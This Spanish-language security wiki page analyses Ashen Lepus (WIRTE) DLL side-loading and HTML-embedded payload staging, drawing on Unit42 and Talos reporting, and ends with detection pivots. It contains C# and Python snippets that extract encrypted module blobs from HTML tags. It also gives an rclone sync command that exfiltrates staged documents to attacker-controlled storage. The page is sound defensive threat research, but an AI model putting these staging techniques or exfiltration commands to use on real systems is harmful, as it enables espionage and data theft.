# Avanzado DLL Side-Loading con HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Resumen de Tradecraft

Ashen Lepus (aka WIRTE) puso en práctica un patrón repetible que encadena DLL sideloading, staged HTML payloads y puertas traseras modulares .NET para persistir dentro de redes diplomáticas del Medio Oriente. La técnica es reutilizable por cualquier operador porque se basa en:

- **Archive-based social engineering**: PDFs benignos instruyen a las víctimas a descargar un archivo RAR desde un sitio de intercambio de archivos. El archivo incluye un EXE visor de documentos con apariencia legítima, un DLL malicioso nombrado como una biblioteca confiable (p. ej., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), y un señuelo `Document.pdf`.
- **DLL search order abuse**: la víctima hace doble clic en el EXE, Windows resuelve la importación del DLL desde el directorio actual, y el loader malicioso (AshenLoader) se ejecuta dentro del proceso confiable mientras el PDF señuelo se abre para evitar sospechas.
- **Living-off-the-land staging**: cada etapa posterior (AshenStager → AshenOrchestrator → modules) se mantiene fuera del disco hasta que se necesita, entregada como blobs cifrados escondidos dentro de respuestas HTML aparentemente inofensivas.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: el EXE side-loads AshenLoader, que realiza reconocimiento del host, lo cifra con AES-CTR y lo envía vía POST dentro de parámetros rotativos como `token=`, `id=`, `q=` o `auth=` a rutas con apariencia de API (p. ej., `/api/v2/account`).
2. **HTML extraction**: el C2 solo revela la siguiente etapa cuando la IP del cliente se geolocaliza en la región objetivo y el `User-Agent` coincide con el implant, frustrando sandboxes. Cuando las comprobaciones pasan, el cuerpo HTTP contiene un blob `<headerp>...</headerp>` con el payload AshenStager cifrado en Base64/AES-CTR.
3. **Second sideload**: AshenStager se despliega con otro binario legítimo que importa `wtsapi32.dll`. La copia maliciosa inyectada en el binario obtiene más HTML, esta vez tallando `<article>...</article>` para recuperar AshenOrchestrator.
4. **AshenOrchestrator**: un controlador modular .NET que decodifica una config JSON en Base64. Los campos `tg` y `au` de la config se concatenan/hashean para formar la clave AES, que descifra `xrk`. Los bytes resultantes actúan como clave XOR para cada blob de módulo obtenido posteriormente.
5. **Module delivery**: cada módulo se describe mediante comentarios HTML que redirigen al parser a una etiqueta arbitraria, rompiendo reglas estáticas que solo buscan `<headerp>` o `<article>`. Los modules incluyen persistencia (`PR*`), desinstaladores (`UN*`), reconocimiento (`SN`), captura de pantalla (`SCT`) y exploración de archivos (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Incluso si los defensores bloquean o eliminan un elemento específico, el operador solo necesita cambiar la etiqueta indicada en el comentario HTML para reanudar la entrega.

### Ayudante rápido de extracción (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralelos de evasión de HTML Staging

Investigaciones recientes sobre HTML smuggling (Talos) destacan payloads ocultos como cadenas Base64 dentro de bloques `<script>` en adjuntos HTML y decodificados vía JavaScript en tiempo de ejecución. El mismo truco puede reutilizarse para respuestas C2: colocar blobs cifrados dentro de un script tag (u otro elemento DOM) y decodificarlos en memoria antes de AES/XOR, haciendo que la página parezca HTML ordinario.

## Endurecimiento de Crypto & C2

- **AES-CTR everywhere**: los loaders actuales incrustan claves de 256-bit además de nonces (p. ej., `{9a 20 51 98 ...}`) y opcionalmente añaden una capa XOR usando cadenas como `msasn1.dll` antes/después del descifrado.
- **Infrastructure split + subdomain camouflage**: los staging servers se separan por herramienta, están alojados en ASNs variados y a veces están fronted por subdominios con apariencia legítima, de modo que quemar una etapa no expone el resto.
- **Recon smuggling**: los datos enumerados ahora incluyen listados de Program Files para localizar aplicaciones de alto valor y siempre se cifran antes de salir del host.
- **URI churn**: los parámetros de query y las rutas REST rotan entre campañas (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidando detecciones frágiles.
- **Gated delivery**: los servidores están geo-fenced y solo responden a implants reales. Clientes no aprobados reciben HTML no sospechoso.

## Persistencia & bucle de ejecución

AshenStager deja scheduled tasks que se hacen pasar por trabajos de mantenimiento de Windows y se ejecutan vía `svchost.exe`, por ejemplo:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Estas tareas relanzan la sideloading chain en el arranque o a intervalos, asegurando que AshenOrchestrator pueda solicitar módulos frescos sin tocar el disco de nuevo.

## Uso de clientes de sincronización benignos para exfiltración

Los operadores colocan diplomatic documents dentro de `C:\Users\Public` (legible por todos y no sospechoso) a través de un módulo dedicado, y luego descargan el binario legítimo de [Rclone](https://rclone.org/) para sincronizar ese directorio con almacenamiento controlado por el atacante. Unit42 señala que es la primera vez que este actor ha sido observado usando Rclone para exfiltration, alineándose con la tendencia más amplia de abusar de herramientas legítimas de sync para mezclarse con el tráfico normal:

1. **Stage**: copiar/recopilar archivos objetivo en `C:\Users\Public\{campaign}\`.
2. **Configure**: desplegar un archivo de configuración de Rclone apuntando a un endpoint HTTPS controlado por el atacante (p. ej., `api.technology-system[.]com`).
3. **Sync**: ejecutar `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` para que el tráfico se asemeje a respaldos en la nube normales.

Dado que Rclone se usa ampliamente en flujos legítimos de backup, los defensores deben centrarse en ejecuciones anómalas (binaries nuevos, remotes extraños o sincronizaciones repentinas de `C:\Users\Public`).

## Pivotes de detección

- Generar alertas sobre **signed processes** que inesperadamente carguen DLLs desde rutas escribibles por el usuario (filtros de Procmon + `Get-ProcessMitigation -Module`), especialmente cuando los nombres de DLL coinciden con `netutils`, `srvcli`, `dwampi` o `wtsapi32`.
- Inspeccionar respuestas HTTPS sospechosas buscando **grandes blobs Base64 embebidos dentro de tags inusuales** o protegidos por comentarios `<!-- TAG: <xyz> -->`.
- Extender la caza en HTML a **cadenas Base64 dentro de `<script>` blocks** (staging al estilo HTML smuggling) que se decodifican vía JavaScript antes del procesamiento AES/XOR.
- Buscar **scheduled tasks** que ejecuten `svchost.exe` con argumentos no propios de servicios o que apunten de vuelta a directorios dropper.
- Monitorizar la aparición de binarios **Rclone** fuera de ubicaciones gestionadas por IT, nuevos archivos `rclone.conf`, o jobs de sync que extraigan desde directorios de staging como `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)

{{#include ../../../banners/hacktricks-training.md}}
